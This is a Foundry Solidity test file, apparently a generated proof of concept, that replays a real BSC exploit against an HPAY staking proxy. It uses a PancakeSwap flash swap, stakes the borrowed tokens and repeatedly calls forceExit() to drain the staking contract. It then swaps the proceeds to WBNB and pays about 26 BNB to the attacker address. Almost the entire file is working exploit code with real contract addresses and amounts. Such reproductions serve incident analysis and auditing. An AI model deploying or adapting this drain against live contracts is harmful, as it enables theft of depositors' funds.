// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import {Test, console2} from "forge-std/Test.sol";
import "./Base.sol";

// @KeyInfo - Total Lost : N/A
// Attacker : 0x734e1bda62e779878f6c6f9f42d793badf247244
// Attack Contract : 0x0dc0c0e040cadcc3855fa347daa192bc5fc9d6e8
// Vulnerable Contract : N/A
// Attack Tx : 0x5f2ea6cb43d14986188fa2f474d9e22502fa95cc76cab72cd6ba1ba146ed137f
// Block : 83268463
// Chain : BSC
// Analysis :
//
// @Reproduction
// Verdict : pass
// Economic Proof : attacker_profit_reproduction
// Reproduced Value : 15.68K USD
//
// @POC Author
// Generated PoC

interface ISwapTarget {
    function swap(uint256 arg0, uint256 arg1, address arg2, bytes calldata arg3) external;
}

contract AttackTest is Base {
    address constant ATTACKER_EOA = Addresses.attacker_eoa;
    address constant ATTACK_CONTRACT = Addresses.attack_contract;
    uint256 constant FORK_BLOCK = 83268462;
    uint256 constant TX_TIMESTAMP = 1772016642;
    uint256 constant TX_BLOCK_NUMBER = 83268463;
    uint256 constant TX_VALUE = 0;

    function setUp() public {
        vm.createSelectFork(vm.envString("POC_FORK_ENDPOINT"));
        if (TX_TIMESTAMP != 0) vm.warp(TX_TIMESTAMP);
        if (TX_BLOCK_NUMBER != 0) vm.roll(TX_BLOCK_NUMBER);
    }

    function testPoC() public {
        vm.startPrank(ATTACKER_EOA, ATTACKER_EOA);
        AttackContract attack = _deployAttack();
        _prepareProfit(attack);
        _logBalances("Before exploit");
        attack.attack{value: TX_VALUE}();
        _logBalances("After exploit");
        vm.stopPrank();
        _assertProfit();
    }

    function _deployAttack() internal returns (AttackContract attack) {
        _etchRuntime();
        attack = AttackContract(payable(ATTACK_CONTRACT));
        attack.bindAttackChild(Addresses.attack_contract);
    }

    function _prepareProfit(AttackContract attack) internal {
        _prepareProfit(address(attack), _expectedAttackChild(attack));
    }

    function _expectedAttackChild(AttackContract attack) internal pure returns (address) {
        attack;
        return Addresses.attack_contract;
    }

    function _etchRuntime() internal {
        // Exact-address runtime for CREATE and callback surfaces.
        vm.etch(ATTACK_CONTRACT, type(AttackContract).runtimeCode);
        vm.setNonce(ATTACK_CONTRACT, 1);
    }

    function _expectProfitLegs(address attack, address attackChild) internal override {
        attack;
        attackChild;
        _expectProfit(Addresses.attacker_eoa, address(0), Addresses.ZERO, "BNB", 26014028087022048755);
    }
}

contract AttackContract {
    AttackChild public attackChild;

    constructor() payable {
        attackChild = AttackChild(payable(address(this)));
    }

    function attack() external payable {
        if (address(attackChild) == address(0)) {
            attackChild = AttackChild(payable(address(this)));
        }

        require(Addresses.attack_contract.code.length != 0, "attack child runtime missing");
        _readStakingToken();
        _swapAndCashOut();
    }

    function _swapAndCashOut() internal {
        _swapPancakePath();
    }

    function _swapPancakePath() internal {
        ICake_LP_E233(Addresses.Cake_LP_E233).token0();
        ICake_LP_E233(Addresses.Cake_LP_E233).token1();
        if (Addresses.HPAY.code.length != 0) {
            IERC20Like(Addresses.HPAY).balanceOf(Addresses.TransparentUpgradeableProxy_6E30C1);
        } else {
            _warnMissingHpay();
        }

        ISwapTarget(Addresses.Cake_LP_E233)
            .swap(
                0,
                1247859356589113617021276,
                Addresses.attack_contract,
                hex"00000000000000000000000000000000000000000001083e975d5f92f1d5f95c"
            );
        if (Addresses.HPAY.code.length != 0) {
            IERC20Like(Addresses.HPAY).balanceOf(address(this));
        } else {
            _warnMissingHpay();
        }

        uint256 routerAllowance = 57389615035922969249945579;
        if (Addresses.HPAY.code.length != 0) {
            IERC20Like(Addresses.HPAY).approve(Addresses.A_10ED43_024E, routerAllowance);
        } else {
            _warnMissingHpay();
        }

        bytes memory swapExactTokensPayload = abi.encodeWithSelector(
            bytes4(0x791ac947),
            57389615035922969249945579,
            0,
            160,
            address(this),
            1772016942,
            3,
            Addresses.HPAY,
            Addresses.BTCB,
            Addresses.WBNB
        );
        (bool routerSwapOk,) = Addresses.A_10ED43_024E.call(swapExactTokensPayload);
        require(routerSwapOk, "router swap failed");

        (bool profitTransferOk,) = payable(Addresses.attacker_eoa).call{value: 26014224201105944931}("");
        require(profitTransferOk, "profit transfer failed");
    }

    function _pancakeCallback() internal {
        _callbackDone[PANCAKE_CB] = true;
        _stakeAndExit();
        _forceExitLoop(37);
        _returnHpayToPair();
    }

    function _stakeAndExit() internal {
        if (Addresses.HPAY.code.length != 0) {
            IERC20Like(Addresses.HPAY).balanceOf(address(this));
        } else {
            _warnMissingHpay();
        }

        uint256 stakingAllowance = 1197944982325549072340425;
        if (Addresses.HPAY.code.length != 0) {
            IERC20Like(Addresses.HPAY).approve(Addresses.TransparentUpgradeableProxy_6E30C1, stakingAllowance);
        } else {
            _warnMissingHpay();
        }

        uint256 stakingAmount = 1197944982325549072340425;
        ITransparentUpgradeableProxy_6E30C1(Addresses.TransparentUpgradeableProxy_6E30C1).stake(stakingAmount);

        if (Addresses.HPAY.code.length != 0) {
            IERC20Like(Addresses.HPAY).balanceOf(Addresses.TransparentUpgradeableProxy_6E30C1);
        } else {
            _warnMissingHpay();
        }
        _forceExitLoop(12);
    }

    function _forceExitLoop(uint256 count) internal {
        ITransparentUpgradeableProxy_6E30C1 proxy =
            ITransparentUpgradeableProxy_6E30C1(Addresses.TransparentUpgradeableProxy_6E30C1);
        for (uint256 i = 0; i < count; i++) {
            proxy.forceExit();
        }
    }

    function _returnHpayToPair() internal {
        ITransparentUpgradeableProxy_6E30C1(Addresses.TransparentUpgradeableProxy_6E30C1).forceExit();

        uint256 hpayTransferAmount = 1309689098028935294735271;
        if (Addresses.HPAY.code.length != 0) {
            IERC20Like(Addresses.HPAY).transfer(Addresses.Cake_LP_E233, hpayTransferAmount);
        } else {
            _warnMissingHpay();
        }
    }

    function _readStakingToken() public view {
        ITransparentUpgradeableProxy_6E30C1(Addresses.TransparentUpgradeableProxy_6E30C1).stakingToken();
    }

    receive() external payable {}

    fallback() external payable {
        if (msg.data.length == 0) return;
        if (msg.sig == 0x682aa435) {
            _swapAndCashOut();
            bytes memory ret = hex"";
            assembly { return(add(ret, 32), mload(ret)) }
        }
        if (msg.sig == 0x84800812) {
            if (!_callbackDone[PANCAKE_CB]) _pancakeCallback();
            bytes memory ret = hex"";
            assembly { return(add(ret, 32), mload(ret)) }
        }
        _emptyCallback();
    }

    function _emptyCallback() internal {}

    function bindAttackChild(address attackChildAddress) external {
        attackChild = AttackChild(payable(attackChildAddress));
    }

    bytes32 private constant PANCAKE_CB = keccak256("poc.callback.pancake");
    mapping(bytes32 => bool) private _callbackDone;

    function _warnMissingHpay() internal pure {
        console2.log("PoCWarning", "skipping missing-code HPAY call", "0xc75aa1fa199eac5adabc832ea4522cff6dfd521a");
    }
}

contract AttackChild {
    receive() external payable {}
}

library Addresses {
    address internal constant ZERO = address(0);
    address internal constant attack_contract = 0x0dc0c0E040CaDCc3855Fa347dAa192bC5fC9D6e8;
    address internal constant A_10ED43_024E = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address internal constant A_1855A2_DECD = 0x1855a2F77eA90e68FC589c06908b88Ff5B16DeCd;
    address internal constant A_50720E_F92B = 0x50720E10f47F21e59eB5C7a13Bd31f10A5b0F92B;
    address internal constant Cake_LP = 0x61EB789d75A95CAa3fF50ed7E47b96c132fEc082;
    address internal constant TransparentUpgradeableProxy_6E30C1 = 0x6E30c17D2554DCA5A1Ac178939764c6Bf61AB95a;
    address internal constant GnosisSafeProxy = 0x6FF5A4e3c726499F4b7F39421396Fe2E1B401BAE;
    address internal constant BTCB = 0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c;
    address internal constant attacker_eoa = 0x734e1bDa62e779878f6C6F9F42d793badf247244;
    address internal constant A_9D8F9F_75D8 = 0x9D8F9f929EF3a0fB7063007DA18aE8c8603675D8;
    address internal constant BalancerVault = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
    address internal constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address internal constant A_C405C3_CD1C = 0xc405c35ceC783C2ccc5430Dd13C2dbd18adCCd1c;
    address internal constant HPAY = 0xC75aa1Fa199EaC5adaBC832eA4522Cff6dFd521A;
    address internal constant A_CABBA5_9114 = 0xcabBA5f0D9911D46010D50a0F6d8bAfA2B019114;
    address internal constant Cake_LP_E233 = 0xF603ae6EF2Bf30EC77539279eFbE80e3e0e8e233;
    address internal constant A_FFFFFF_FFFF = 0xFFfFfFffFFfffFFfFFfFFFFFffFFFffffFfFFFfF;
}

interface ICake_LP_E233 {
    function token0() external view returns (uint256);
    function token1() external view returns (uint256);
}

interface ITransparentUpgradeableProxy_6E30C1 {
    function forceExit() external;
    function stake(uint256) external;
    function stakingToken() external view returns (uint256);
}
